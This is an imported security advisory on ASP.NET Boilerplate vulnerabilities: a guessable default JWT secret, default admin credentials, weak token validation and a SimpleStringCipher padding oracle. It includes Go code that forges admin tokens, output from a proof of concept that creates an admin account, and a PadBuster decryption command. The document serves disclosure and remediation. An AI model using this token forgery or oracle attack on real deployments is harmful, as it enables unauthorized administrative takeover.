---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-26_aspnet-boilerplate-multiple-vulnerabilities.md
original_filename: 2022-08-26_aspnet-boilerplate-multiple-vulnerabilities.md
title: ASP.NET Boilerplate Multiple Vulnerabilities
category: documents
detected_topics:
- jwt
- idor
- access-control
- command-injection
- otp
- rate-limit
tags:
- imported
- documents
- jwt
- idor
- access-control
- command-injection
- otp
- rate-limit
language: en
raw_sha256: ca5d2e2f5f459ca26445a14aaae73944b7fddaaa921525ad528a1f841b91b777
text_sha256: 791b2824f2870ae6c906b784cbc58746d49b160376c177d6cf27d3f97f954d40
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: true
---

# ASP.NET Boilerplate Multiple Vulnerabilities

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-26_aspnet-boilerplate-multiple-vulnerabilities.md
- Source Type: markdown
- Detected Topics: jwt, idor, access-control, command-injection, otp, rate-limit
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: True
- Raw SHA256: `ca5d2e2f5f459ca26445a14aaae73944b7fddaaa921525ad528a1f841b91b777`
- Text SHA256: `791b2824f2870ae6c906b784cbc58746d49b160376c177d6cf27d3f97f954d40`


## Content

---
title: "ASP.NET Boilerplate Multiple Vulnerabilities"
url: "https://pulsesecurity.co.nz/advisories/aspnetboilerplate-jwt"
final_url: "https://pulsesecurity.co.nz/advisories/aspnetboilerplate-jwt"
authors: ["Sana Oshika (@bigshika)"]
programs: ["Volosoft (ASP.NET Boilerplate)"]
bugs: ["Broken authentication", "Hardcoded credentials", "JWT", "Padding oracle attack", "Cryptographic issues"]
publication_date: "2022-08-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2260
---

# ASP.NET Boilerplate Multiple Vulnerabilities

by Sana Oshika

### Recent Releases

####  advisories [See all](/advisories)

  * 12/6/24  [CodiMD Unauthorised Image Access](/advisories/codimd-missing-image-access-controls)
  * 5/6/24  [Slack Web Hook Message Injection Advisory](/advisories/slack-message-injection)
  * 18/3/24  [Bypassing USBGuard on Linux](/advisories/usbguard-bypass)
  * 20/9/23  [HDF5 - Multiple Memory Corruption Vulnerabilities](/advisories/hdf5-memory-corruption)

* * *

####  articles [See all](/articles)

  * 26/5/26  [Stealing Browser Sessions with DevTools](/articles/stealing_browser_sessions_with_devtools)
  * 22/5/26  [Timeboxed Penetration Testing - Pulse Security’s Approach](/articles/timeboxed-penetration-tests)
  * 13/2/26  [Harvesting Intune Device Scripts Without Tools](/articles/intune-device-scripts)
  * 14/1/26  [Sensitive data in URLs: Why private links aren’t private anymore due to threat intelligence feeds](/articles/unguessable_url_issues)

Aug 26 2022

Multiple vulnerabilities were discovered in the ASP.NET Boilerplate (ABP) framework, including issues which allow an unauthenticated attacker to gain unauthorized administrative access to an ABP site. These issues also affect the ASP.Net Zero framework.

ABP users are advised to update the `SecurityKey` parameter in their `appsettings.json` file to a secure random string, and change the password of the admin user from the default value.

**Date Released:** 26/08/2022  
**Author:** Sana Oshika  
**Vendor Website:** <https://www.aspnetboilerplate.com/>  
**Affected Software:** ASP.NET Boilerplate Version 7.3.0.0 [20221208] for dotnetcore

The main ASP.NET Boilerplate website provides a generator to generate source code for a web application, which is the documented download method for new installations. The default JSON Web Token secret used to validate tokens is easily guessable and means that an attacker can gain unauthorized administrative access to an ABP instance. A secure value would be generated randomly and long enough to resist bruteforcing. A random 40-character string would meet these requirements.

This advisory applies to the .NET Core version of the code as this is the only version of the back-end code that uses JWT authentication. The weak JWT signing secret was also preset on the ASP.Net Zero commercial framework. Additionally, a padding oracle vulnerability was discovered which allows an attacker to retrieve encrypted tokens sent via `GET` parameters in `signalr` chat requests.

## Details

### Weak JWT Signing Secret Default

Authentication and authorization for ASP.NET Boilerplate is implemented with JSON Web Tokens (JWTs) issued by the app back-end server. When a user logs in, a call is made to the `/api/TokenAuth/Authenticate` API endpoint that returns a JWT signed using a secret in the `appsettings.json` file. In a newly generated ABP project, this value is set to `PROJECTNAME_C421AAEE0D114E9C`. The project name is specified when generating a new framework download:

[![](/assets/images/releases/2022-08-26-aspboilerplate-jwt/abp-download.PNG)](/assets/images/releases/2022-08-26-aspboilerplate-jwt/abp-download.PNG)

A guessable token secret enables an attacker to create and sign tokens that will be accepted by the back-end server as valid. While the project name is required for the secret to be known, this not a sensitive variable. The project name is the login page title for a newly generated project and is also visible in the copyright footer and thus accessible by an unauthenticated attacker. This information is also exposed in an unauthenticated API endpoint.

The following figure shows an example appsettings.json file. The `_C421AAEE0D114E9C` suffix of the token secret is a constant across all generated projects.
  
  
  $ cat aspnet-core/src/ACME.Web.Host/appsettings.json
  {
  omitted for brevity...
  "Authentication": {
  "JwtBearer": {
  "IsEnabled": "true",
  "SecurityKey": "ACME_C421AAEE0D114E9C",
  ...omitted for brevity...
  }
  }
  

A proof-of-concept exploit that retrieves the project name from unauthenticated pages on a target server, signs a fraudulent token, and creates a malicious admin has been included in this [Gist](https://gist.github.com/bigshika/c577d58593dab01b69d1e5bbcee72a8e). The following figure shows the POC exploit code generating a malicious admin:
  
  
  $ go run ./abp_poc
  Targeting: https://localhost:44311/
  Project Name is: MyProject
  Checking for admin users...
  Generating token for userid: 1
  UserId: 1
  Username: admin
  User's full name: admin admin
  User's Email: [[email protected]](/cdn-cgi/l/email-protection)
  Permissions Granted to this User are: Pages.Tenants:true Pages.Users:true Pages.Users.Activation:true Pages.Roles:true 
  Admin found! Using this user to create new admin user...
  New admin user successfully created!
  Log in with ExampleAdmin:testTEST123
  

The following Golang code will generate a token that will be accepted by the server.
  
  
  import "github.com/golang-jwt/jwt/v4"
  
  ...omitted for brevity...
  
  func buildToken(projectName string, id int) string {
  // Create a new token valid from 1/1/1970 and valid till INT_MAX
  token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": fmt.Sprint(id),
  "iat": 0,
  "nbf": 0,
  "exp": 2147483647,
  "iss": projectName,
  "aud": projectName,
  })
  
  // Sign and get the complete encoded token as a string using the secret
  tokenString, err := token.SignedString([]byte(projectName + "_C421AAEE0D114E9C"))
  if err != nil {
  fmt.Println(err)
  return ""
  }
  return tokenString
  }
  

This secret can be changed in the configuration file after the project is downloaded; however, this requires foreknowledge by the user that the provided token secret is an insecure default that should be changed before deploying the app. This is not given in the documentation.

This issue also affected the [ABP.Zero](https://aspnetzero.com/) commercial version of the framework; however, the pattern was: `PROJECTNAME_8CFB2EC534E14D56`

### Default Admin User

When a new project is created, a default admin user is created. The credentials for this user default to `admin:123qwe`. This is a weak password that is used across all generated projects. This admin user can never be deleted as it is the default user. Default credentials are commonly used by attackers to compromise target services, and a randomly generated admin password used per-instance is a more secure alternative.

This default password is defined in `User.cs` as shown in the snippet below:
  
  
  namespace MyProject.Authorization.Users
  {
  public class User : AbpUser<User>
  {
  public const string DefaultPassword=***REDACTED***;
  ...omitted for brevity...
  

The only way admin permissions can be removed from this user is by another administrator removing the admin role from them. Simply deactivating the user does not prevent a token created using the ID of the default admin from performing administrative actions.

### Token Validation

The back-end token validation checks the user ID and the permissions assigned to that user; however, there is no check as to whether the user is still active. While a deactivated user is prevented from logging in on the front end, a malicious JWT generated on behalf of a deactivated admin user will still be able to perform all of the API actions as an active user.

Additionally, tokens were still valid after logging out. This increases the likelihood of a malicious user getting hold of a valid token and maintaining access to the system.

### User ID Enumeration

The default admin user has the user ID of 1, so if an attacker generates a valid token for this user, they can perform administrative functions. However, even if administrator privileges have been removed from the default admin, an attacker can keep generating signed tokens and increment the user ID until a user is found that does have the right permissions. When present in combination with the weak secret, this allows an attacker to discover an admin account even if the default admin is unavailable.

### SimpleStringCipher Padding Oracle Attack

The `signalr` endpoint passed a user token in a `GET` parameter. The user token is encrypted using the `SimpleStringCipher` class, as `GET` parameters are not suitable for the transmission of secret information. The `SimpleStringCipher` used the dotnet default AES encryptor, which is vulnerable to padding oracle attacks (further information is available in this blog post: [Dotnet’s default AES mode is vulnerable to padding oracle attacks](https://pulsesecurity.co.nz/articles/dotnet-padding-oracles)).

The [PadBuster tool](https://github.com/AonCyberLabs/PadBuster) can be used to decrypt the encrypted parameter using the `signalr` endpoint as an oracle:
  
  
  $ perl padBuster.pl 'https://localhost:44311/signalr/negotiate?enc_auth_token=wNYmO41/48SHNstaLVXxHCCre29BZQl1NhC6NM3R3rzpXtPQxVzH6jEzA/QhXFN5tu6Fk7pO53uppm1mVXMZgxbyRVz26dnepi/FyB6axBY+6gq1GL+uRQgoiFUCjRN2p8w6LevViwKlHyWZZJZO1DGVSjAi1m2U+og9pkHw9/SXYAkZ0oMKKMG4U14uRdix922nagJjM1vCwfZCcUyW5VgJLH4wln2HJAecacfA6Yw56kNP9gJi2yf6GtpppwjvS427xuk6aSsgUcWvOfhm0I57FNrSeva+NthzDzH8RMP+6mGfFQw92Ai+mC/E/PlCpz1t3A9NgoBWNINq3RD6AMJ8byydRxf/rHY2w1qOUWMOAcjXOFcMWpAU+akKqdhcJIZeLv8FRriXwlB5Y7S7ZIg/Iq/vVvP8GsUxaBkIz2rmHdFOyBDF0qS/EmkF8OK/HTCpsCb171r+sqEWDsOh41s7/f9qnxHnLvhARTJu1tlFXSzUS8cRdpZLuuA7Dv2KUeBrw4xwsxhDHbhCEBaojXqF/2qjw2ON1jKKhN34ekRGuJoAMEmCi4PSnA+pEU7UT69aFAcV2Cxb3o78K9DJ3f7d+v914/dRMjS+ytQLDgalvR46eoG9LZct3wmVKW37XqQUn1kftEmNPQgp30YYJxDxFfXbhNjLcbv37G7mooxANwzdvIu5Z2BabnKx3zC+H1JNIagmqpGtpFg/FGu2kIwTyNJdSUyYxxsNQ4wEbVp8z/Y84zANFIobKkGFrMOSSLo4PeBnaACnGWkHCFoC2lAe61Qn+9kl4OrOT4h7mrn+0irKLmMnDyxFoOIOTquL5GrpC4/mEtS/4DXls6bpsxeddnrHXJqZv2TQq1FAc/Z/+s7K8mbbp4gic1YlXW1J49Ry9Ozlsg/a7edaCyxv5a3GRncjoPTRtXyhjQgbqcRpfIRU/hvFJHAa4N+6JlIL/AbmBhMdnv4mNULSvMEQ7rMKNCL5+1pHjxkD8Fh9DwYh+h25sI50Y/MeoTbVFXJZ' 'wNYmO41/48SHNstaLVXxHCCre29BZQl1NhC6NM3R3rzpXtPQxVzH6jEzA/QhXFN5tu6Fk7pO53uppm1mVXMZgxbyRVz26dnepi/FyB6axBY+6gq1GL+uRQgoiFUCjRN2p8w6LevViwKlHyWZZJZO1DGVSjAi1m2U+og9pkHw9/SXYAkZ0oMKKMG4U14uRdix922nagJjM1vCwfZCcUyW5VgJLH4wln2HJAecacfA6Yw56kNP9gJi2yf6GtpppwjvS427xuk6aSsgUcWvOfhm0I57FNrSeva+NthzDzH8RMP+6mGfFQw92Ai+mC/E/PlCpz1t3A9NgoBWNINq3RD6AMJ8byydRxf/rHY2w1qOUWMOAcjXOFcMWpAU+akKqdhcJIZeLv8FRriXwlB5Y7S7ZIg/Iq/vVvP8GsUxaBkIz2rmHdFOyBDF0qS/EmkF8OK/HTCpsCb171r+sqEWDsOh41s7/f9qnxHnLvhARTJu1tlFXSzUS8cRdpZLuuA7Dv2KUeBrw4xwsxhDHbhCEBaojXqF/2qjw2ON1jKKhN34ekRGuJoAMEmCi4PSnA+pEU7UT69aFAcV2Cxb3o78K9DJ3f7d+v914/dRMjS+ytQLDgalvR46eoG9LZct3wmVKW37XqQUn1kftEmNPQgp30YYJxDxFfXbhNjLcbv37G7mooxANwzdvIu5Z2BabnKx3zC+H1JNIagmqpGtpFg/FGu2kIwTyNJdSUyYxxsNQ4wEbVp8z/Y84zANFIobKkGFrMOSSLo4PeBnaACnGWkHCFoC2lAe61Qn+9kl4OrOT4h7mrn+0irKLmMnDyxFoOIOTquL5GrpC4/mEtS/4DXls6bpsxeddnrHXJqZv2TQq1FAc/Z/+s7K8mbbp4gic1YlXW1J49Ry9Ozlsg/a7edaCyxv5a3GRncjoPTRtXyhjQgbqcRpfIRU/hvFJHAa4N+6JlIL/AbmBhMdnv4mNULSvMEQ7rMKNCL5+1pHjxkD8Fh9DwYh+h25sI50Y/MeoTbVFXJZ' 16 -encoding 0 -noiv -post
  Option post requires an argument
  +-------------------------------------------+
  | PadBuster - v0.3.3  |
  | Brian Holyfield - Gotham Digital Science  |
  | [[email protected]](/cdn-cgi/l/email-protection)  |
  +-------------------------------------------+
  
  INFO: The original request returned the following
  [+] Status: 500
  [+] Location: N/A
  [+] Content Length: 0
  
  INFO: Starting PadBuster Decrypt Mode
  *** Starting Block 1 of 48 ***
  ...omitted for brevity...
  [+] Success: (254/256) [Byte 16]
  ...omitted for brevity...
  Block 1 Results:
  [+] Cipher Text (HEX): ***REDACTED-SUSPECT-TOKEN***  [+] Intermediate Bytes (HEX): ***REDACTED-SUSPECT-TOKEN***  [+] Plain Text: \[uPYpf}
  ...omitted for brevity...
  ** Finished ***
  [+] Decrypted value (ASCII): \[uPYpf}NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjYiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYmJiYiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2VtYWlsYWRkcmVzcyI6ImJiYkBleGFtcGxlLmNvbSIsIkFzcE5ldC5JZGVudGl0eS5TZWN1cml0eVN0YW1wIjoiSFBOQ0w3SExIRVpJREZSSUY0QUdZTkFWMklRUFlDVFgiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJBZG1pbiIsInN1YiI6IjYiLCJqdGkiOiJhNDYwYzBlYi0wZDRmLTQ5ZTEtYTlkMi0xYTcxZmU5ZTI0MTQiLCJpYXQiOjE2NjA4NzkyNjUsIm5iZiI6MTY2MDg3OTI2NSwiZXhwIjoxNjYwOTY1NjY1LCJpc3MiOiJNeVByb2plY3QiLCJhdWQiOiJNeVByb2plY3QifQ.RGY***REDACTED-SUSPECT-TOKEN***  [+] Decrypted value (HEX): ...omitted for brevity...
  
  [+] Decrypted value (Base64): ...omitted for brevity...
  

As described in the blog post above, the correct first 16 bytes of the token can be found by XOR-ing the output of this first `Padbuster.pl` run with the first 16 bytes of a JWT then rerunning `Padbuster.pl`.

This means that the encryption is not secure and the plain text of the tokens can be extracted by an attacker, which can then be used with the API. Due to the encrypted tokens being in query parameters, an attacker who can see the URLs of those requests can therefore obtain a valid token. Additionally, the `signalr` endpoint could be used as an oracle to decrypt any other ciphertexts encrypted with the `SimpleStringCipher` class.

The padding oracle attack also affects ASP.Net Zero.

## Timeline

22/08/2022 - Email sent to `[[email protected]](/cdn-cgi/l/email-protection)`.  
26/08/2022 - [Github Issue](https://github.com/aspnetboilerplate/aspnetboilerplate/issues/6526) created in project repository.  
26/08/2022 - Vendor responds to ask for public disclosure.  
26/08/2022 - Advisory published and Github Issue updated with details.

* * *

_Follow us on[LinkedIn](https://nz.linkedin.com/company/pulsesecurity)_

* * *
